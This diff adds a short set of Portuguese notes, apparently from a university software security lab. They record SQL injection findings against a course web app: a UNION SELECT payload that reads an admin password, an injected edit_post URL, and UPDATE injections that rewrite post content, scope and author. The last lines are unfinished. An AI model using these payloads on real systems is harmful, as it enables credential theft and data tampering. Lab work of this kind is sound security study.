@@ -1,0 +1,34 @@
+GET:
+[x] Conseguimos aceder a posts de outros utilizadores e edita-los (conteudo e scope)
+como se fossemos o outro utilizador
+
+
+[x] Conseguimos leitura arbitraria da base de dados
+
+    ' and 1=0 union select 1,2,password,4,5,6 from Users where username = 'ssofadmin
+http://56cb2c11fc0868ed95fe9739052b47bc7770cb37b263113029d198840253.project.ssof.rnl.tecnico.ulisboa.pt/edit_post?id=%27%20or%20author=%27administrator
+
+
+
+POST:
+
+[x] Podemos ler de qualquer coluna da tabela, tal como acontece no perfil bla bla bla
+
+[ ] Conseguimos mudar o autor de qualquer mensagem, o privacy scope
+    HACKED', type='Public', author='ssofadmin'#
+        Muda o conteudo, scope e autor de todos os posts
+
+
+    ', type='Public',
+    content = (
+        SELECT * FROM (
+            SELECT content
+            FROM Posts
+            WHERE id = x
+        ) tmp
+    ) WHERE id=(SELECT id FROM Posts WHERE author='ssofadmin')
+    #
+
+
+WITH (SELECT content from Posts) as posts
+DO ....
